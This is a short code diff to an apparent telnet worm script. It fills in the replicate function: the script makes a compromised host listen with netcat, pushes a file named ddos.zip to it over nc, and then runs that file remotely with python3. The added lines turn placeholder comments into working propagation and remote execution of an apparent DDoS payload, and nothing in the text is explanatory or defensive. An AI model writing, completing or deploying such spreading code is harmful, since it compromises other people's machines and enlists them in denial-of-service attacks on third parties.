@@ -42,9 +42,11 @@ def login(host, username, password):
 def replicate(tn):
     try:
         # Open nc connection to receive the file
-        tn.write(b"nc -l -p 1234 > out.file")  # CHANGE FILE NAME
-        os.system("nc -w 5 {} 1234 < in.file".format(tn.host))  # CHANGE FILE NAME
-        # EXECUTE SCRIPT HERE
+        tn.write(b"nc -l -p 1234 > ddos.zip")
+        os.system("nc -w 5 {} 1234 < ddos.zip".format(tn.host))
+        # Execute script
+        tn.write(b"python3 ddos.zip > logs.txt")
+
         tn.close()
     except EOFError:
         print("Connection to host lost")
